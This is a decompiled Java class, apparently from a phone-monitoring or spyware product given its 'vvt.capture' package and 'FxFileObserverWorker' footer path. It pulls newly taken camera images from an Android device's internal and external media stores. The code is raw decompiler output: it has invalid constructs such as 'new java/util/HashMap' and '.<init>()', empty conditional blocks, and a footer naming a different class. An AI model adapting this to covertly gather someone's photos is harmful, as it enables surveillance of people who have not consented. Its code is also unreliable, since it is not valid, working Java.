package com.vvt.capture.camera.image.b;

import android.content.ContentResolver;
import android.net.Uri;
import com.vvt.base.capture.f;
import com.vvt.capture.camera.image.CameraImageReference;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;

public class g
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private ContentResolver b;
  private String c;
  
  public g(String paramString, ContentResolver paramContentResolver)
  {
    this.b = paramContentResolver;
    this.c = paramString;
  }
  
  public com.vvt.base.capture.g a()
  {
    Object localObject1 = this.b;
    Object localObject2 = a.a;
    localObject1 = b.a((ContentResolver)localObject1, (Uri)localObject2);
    localObject2 = this.b;
    Object localObject3 = a.b;
    localObject2 = b.a((ContentResolver)localObject2, (Uri)localObject3);
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    localObject3 = new java/util/HashMap;
    ((HashMap)localObject3).<init>();
    ((HashMap)localObject3).put("external", localObject1);
    ((HashMap)localObject3).put("internal", localObject2);
    localObject1 = new com/vvt/capture/camera/image/CameraImageReference;
    ((CameraImageReference)localObject1).<init>();
    ((CameraImageReference)localObject1).setReference((HashMap)localObject3);
    return (com.vvt.base.capture.g)localObject1;
  }
  
  public List a(int paramInt)
  {
    long l = 1024000L;
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = this.b;
    Object localObject3 = a.a;
    localObject2 = b.a((ContentResolver)localObject2, (Uri)localObject3, paramInt, l);
    localObject3 = this.c;
    Object localObject4 = this.b;
    Uri localUri = a.a;
    localObject2 = b.a((String)localObject3, (ContentResolver)localObject4, localUri, (List)localObject1, (List)localObject2);
    if (localObject2 != null)
    {
      int j = ((List)localObject2).size();
      if (j > 0)
      {
        boolean bool4 = a;
        if (bool4) {}
        localArrayList.addAll((Collection)localObject2);
      }
    }
    int k = ((List)localObject2).size();
    if (k < paramInt)
    {
      boolean bool5 = a;
      if (bool5) {}
      localObject3 = this.b;
      localObject4 = a.b;
      int i = ((List)localObject2).size();
      i = paramInt - i;
      localObject2 = b.a((ContentResolver)localObject3, (Uri)localObject4, i, l);
      localObject3 = this.c;
      localObject4 = this.b;
      localUri = a.b;
      localObject1 = b.a((String)localObject3, (ContentResolver)localObject4, localUri, (List)localObject1, (List)localObject2);
      if (localObject1 != null)
      {
        i = ((List)localObject1).size();
        if (i > 0)
        {
          boolean bool3 = a;
          if (bool3) {}
          localArrayList.addAll((Collection)localObject1);
        }
      }
    }
    boolean bool6 = a;
    if (bool6) {}
    return localArrayList;
  }
  
  public List a(com.vvt.base.capture.g paramg1, com.vvt.base.capture.g paramg2)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof CameraImageReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof CameraImageReference;
      if (bool1)
      {
        paramg1 = (CameraImageReference)paramg1;
        Object localObject1 = paramg1.getReference();
        paramg2 = (CameraImageReference)paramg2;
        Object localObject2 = paramg2.getReference();
        bool1 = a;
        if (bool1) {}
        List localList1 = (List)((HashMap)localObject1).get("internal");
        List localList2 = (List)((HashMap)localObject2).get("internal");
        Object localObject3 = this.c;
        ContentResolver localContentResolver = this.b;
        Uri localUri = a.b;
        localList1 = b.a((String)localObject3, localContentResolver, localUri, localList1, localList2);
        if (localList1 != null)
        {
          int i = localList1.size();
          if (i > 0)
          {
            boolean bool2 = a;
            if (bool2) {}
            localArrayList.addAll(localList1);
          }
        }
        bool1 = a;
        if (bool1) {}
        localList1 = (List)((HashMap)localObject1).get("external");
        localList2 = (List)((HashMap)localObject2).get("external");
        localObject1 = this.c;
        localObject2 = this.b;
        localObject3 = a.a;
        localList1 = b.a((String)localObject1, (ContentResolver)localObject2, (Uri)localObject3, localList1, localList2);
        if (localList1 != null)
        {
          int j = localList1.size();
          if (j > 0)
          {
            boolean bool3 = a;
            if (bool3) {}
            localArrayList.addAll(localList1);
          }
        }
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/camera/image/removeFromPath/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */